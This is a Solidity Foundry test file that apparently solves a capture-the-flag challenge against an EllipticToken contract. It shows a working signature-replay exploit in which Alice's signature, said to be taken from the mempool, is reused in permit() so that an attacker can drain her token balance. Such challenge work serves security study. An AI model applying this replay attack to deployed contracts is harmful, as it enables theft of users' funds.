// SPDX-License-Identifier: MIT
pragma solidity ^0.8.28;

import {Test} from "forge-std/Test.sol";
import {EllipticToken} from "../EllipticToken.sol";

// signature replay

contract EllipticTokenTest is Test {
    EllipticToken ellipticToken;

    uint256 ownerPk = 0xB0B;
    address owner = vm.addr(ownerPk);

    uint256 alicePk = 0xA11CE;
    address alice = vm.addr(alicePk);

    uint256 attackerPk = 0xA11AC4E;
    address attacker = vm.addr(attackerPk);

    function setUp() public {
        vm.prank(owner);
        ellipticToken = new EllipticToken();
    }
    // i stole what alice send from public mempool
    uint256 amount;
    address receiver;
    bytes32 salt;
    bytes aliceSignature;

    function aliceSignATransaction() public {
        amount = 20;
        receiver = alice;
        salt = "redeemVoucher";
        bytes32 voucherHash = keccak256(abi.encodePacked(amount, receiver, salt));

        (uint8 vOwner, bytes32 rOwner, bytes32 sOwner) = vm.sign(ownerPk, voucherHash);
        bytes memory ownerSignature = abi.encodePacked(rOwner, sOwner, vOwner);

        (uint8 vAlice, bytes32 rAlice, bytes32 sAlice) = vm.sign(alicePk, voucherHash);
        aliceSignature = abi.encodePacked(rAlice, sAlice, vAlice);

        // ellipticToken.redeemVoucher(amount, receiver, salt, ownerSignature, aliceSignature);
    }
    function test_Challenge35_Passed() public {
        aliceSignATransaction();
        bytes32 replayedHash = keccak256(abi.encodePacked(amount, receiver, salt));

        bytes32 permitAcceptHash = keccak256(abi.encodePacked(alice, attacker, uint256(replayedHash)));
        (uint8 vAttacker, bytes32 rAttacker, bytes32 sAttacker) = vm.sign(attackerPk, permitAcceptHash);
        bytes memory attackerSignature = abi.encodePacked(rAttacker, sAttacker, vAttacker);

        bytes memory stolenOwnerSig = aliceSignature;
        ellipticToken.permit(uint256(replayedHash), attacker, stolenOwnerSig, attackerSignature);

        // attacker can now steal the tokens
        uint256 stealIt = ellipticToken.balanceOf(alice);
        vm.prank(attacker);
        ellipticToken.transferFrom(alice, attacker, stealIt);
        assertEq(ellipticToken.balanceOf(attacker), stealIt);
        assertEq(ellipticToken.balanceOf(alice), 0);
    }
}